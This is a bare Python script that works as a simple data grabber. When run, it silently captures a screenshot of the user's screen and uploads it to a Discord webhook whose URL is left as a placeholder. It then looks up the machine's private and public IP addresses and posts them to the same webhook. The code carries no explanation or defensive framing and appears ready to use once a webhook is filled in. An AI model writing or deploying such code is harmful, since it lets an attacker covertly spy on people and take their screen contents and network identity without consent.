import requests
import pyautogui
import socket
import urllib.request

WEBHOOK_URL = "WEBHOOK HERE!"

screenshot = pyautogui.screenshot()
screenshot.save("screen.png")


with open("screen.png", "rb") as f:
    requests.post(
        WEBHOOK_URL,
        files={"file": ("screen.png", f, "image/png")}
    )

def send_to_discord(text):
    data = {"content": text}
    requests.post(WEBHOOK_URL, json=data)

def get_private_ip():
    return socket.gethostbyname(socket.gethostname())

def get_public_ip():
    with urllib.request.urlopen("https://api.ipify.org") as response:
        return response.read().decode()

private = get_private_ip()
public = get_public_ip()

send_to_discord(
    f"""```
PRIVATE IP:
{private}

PUBLIC IP:
{public}
```"""
)

exit(5)
